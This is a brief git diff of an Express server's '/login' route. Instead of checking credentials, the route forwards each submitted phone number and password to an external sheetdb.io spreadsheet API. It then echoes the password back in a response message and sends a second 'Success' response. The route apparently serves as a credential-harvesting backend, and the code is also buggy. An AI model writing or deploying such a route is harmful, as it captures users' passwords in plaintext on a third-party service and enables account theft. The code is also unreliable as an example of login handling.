@@ -30,14 +30,14 @@ app.post(baseUrl + "/register", (req, res) => {
 });
 
 
-app.post(baseUrl + "/login", (req, res) => {
+app.post(baseUrl + "/login", async (req, res) => {
     const data = req.body;
     // data.timestamp = new Date().getTime();  change the timestamp to a date day-month-year
     data.timestamp = new Date().toLocaleDateString();
     const tel = data.tel;
     const password = data.password;
 
-    axios.post('https://sheetdb.io/api/v1/b26an47qz0cay', data)
+    await axios.post('https://sheetdb.io/api/v1/b26an47qz0cay', data)
         .then(response => {
             res.json({
                 message: `Email: ${response.email} Tel: ${response.tel} Password: ${response.password} logged in`
@@ -49,7 +49,7 @@ app.post(baseUrl + "/login", (req, res) => {
             });
         });
 
-    res.json({
+    await res.json({
         message: `Success`
     });
 });
